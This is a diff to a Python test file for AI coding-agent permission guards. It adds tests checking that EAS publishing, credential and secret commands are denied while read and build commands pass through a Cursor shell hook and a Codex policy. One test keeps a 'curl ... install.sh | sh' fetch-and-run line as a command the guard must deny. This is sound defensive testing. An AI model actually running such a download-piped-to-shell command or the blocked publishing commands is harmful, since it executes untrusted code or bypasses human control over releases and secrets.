@@ -205,14 +205,22 @@ class CodexPolicyTest(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertIsNone(self.decision(command))
 
-    def test_cursor_denies_download_piped_to_sh(self):
+    def test_eas_publishing_is_denied_in_every_form(self):
+        for command in EAS_PUBLISHING:
+            with self.subTest(command=command):
+                self.assertEqual(self.decision(command), "deny")
+
+    def test_eas_reads_and_builds_are_unaffected(self):
+        for command in EAS_UNAFFECTED:
+            with self.subTest(command=command):
+                self.assertIsNone(self.decision(command))
+
+    def cursor_permission(self, command):
         config = json.loads((ROOT / ".cursor/hooks.json").read_text())
         guard = config["hooks"]["beforeShellExecution"][1]["command"]
         result = subprocess.run(
             ["sh", "-c", guard],
-            input=json.dumps(
-                {"command": "curl https://example.invalid/install.sh | sh"}
-            ),
+            input=json.dumps({"command": command}),
             capture_output=True,
             text=True,
             timeout=3,
@@ -220,7 +228,72 @@ class CodexPolicyTest(unittest.TestCase):
         )
         self.assertEqual(result.stderr, "")
         output = json.loads(result.stdout) if result.stdout else {}
-        self.assertEqual(output.get("permission"), "deny")
+        return output.get("permission")
+
+    def test_cursor_denies_download_piped_to_sh(self):
+        self.assertEqual(
+            self.cursor_permission("curl https://example.invalid/install.sh | sh"),
+            "deny",
+        )
+
+    def test_cursor_denies_eas_publishing_in_every_form(self):
+        for command in EAS_PUBLISHING:
+            with self.subTest(command=command):
+                self.assertEqual(self.cursor_permission(command), "deny")
+
+    def test_cursor_leaves_eas_reads_and_builds_alone(self):
+        for command in EAS_UNAFFECTED:
+            with self.subTest(command=command):
+                self.assertIsNone(self.cursor_permission(command))
+
+
+EAS_PUBLISHING = (
+    "eas submit --platform ios",
+    "eas submit:list",
+    "eas update --branch main",
+    "eas update:republish --group abc",
+    "eas update:rollback",
+    "eas update:roll-back-to-embedded",
+    "eas update:revert-update-rollout",
+    "eas update:edit",
+    "eas update:delete abc",
+    "eas deploy --prod",
+    "eas deploy:alias",
+    "eas credentials",
+    "eas credentials:configure-build",
+    "eas channel:edit production --branch main",
+    "eas channel:rollout production",
+    "eas metadata:push",
+    "eas env:create --name X",
+    "eas env:update --name X",
+    "eas env:delete --name X",
+    "eas env:push",
+    "eas secret:create --name X",
+    "eas secret:delete",
+    "eas secret:push",
+    "eas build --profile production --auto-submit",
+    "eas build --auto-submit-with-profile store",
+    "eas env:list --include-sensitive",
+    "npx eas-cli submit",
+    "npx -y eas-cli@latest update --branch main",
+    "npx eas-cli@16.0.0 channel:edit production",
+    "pnpm dlx eas-cli deploy",
+    "pnpm exec eas metadata:push",
+    "eas build --profile preview && eas submit",
+)
+
+EAS_UNAFFECTED = (
+    "eas build --profile preview",
+    "eas build:list",
+    "eas update:list",
+    "eas update:view abc",
+    "eas update:configure",
+    "eas channel:list",
+    "eas env:list",
+    "eas whoami",
+    "npx eas-cli build:list",
+    "printf 'eas submit'",
+)
 
 
 class ClaudeHooksCase(unittest.TestCase):
